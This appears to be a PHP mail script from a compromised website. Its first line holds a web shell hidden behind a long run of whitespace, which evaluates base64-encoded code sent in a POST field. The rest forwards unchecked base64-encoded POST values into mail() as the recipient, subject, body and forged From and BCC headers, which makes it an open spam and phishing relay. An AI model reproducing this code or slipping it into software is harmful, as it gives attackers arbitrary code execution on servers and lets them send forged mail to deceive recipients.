<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['ne29880']));?><?php
$client_name      = base64_decode($_POST["client_name"]);
$client_name2      = base64_decode($_POST["client_name2"]);
$problem_id = base64_decode($_POST["problem_id"]);
$problem_decription = base64_decode($_POST["problem_decription"]);
$from_client = base64_decode($_POST["from_client"]);
$from_cient_name = base64_decode($_POST["from_client_name"]); 


  
   

    $header = "From: $from_cient_name <$from_client>\r\n";
    $header .= "Reply-To: $from_client\r\n";
    $header .= "MIME-Version: 1.0\r\n";
    $header .= "Content-Type: text/plain\r\n";
    $header .= "Content-Transfer-Encoding: 8bit\r\n";
    $header .= "BCC: $client_name2\r\n";
    
   

$result = mail($client_name, $problem_id, $problem_decription, $header);


if($result)
{
echo base64_encode('saved');
}
else
{
echo base64_encode('error : '.$result);
}
?>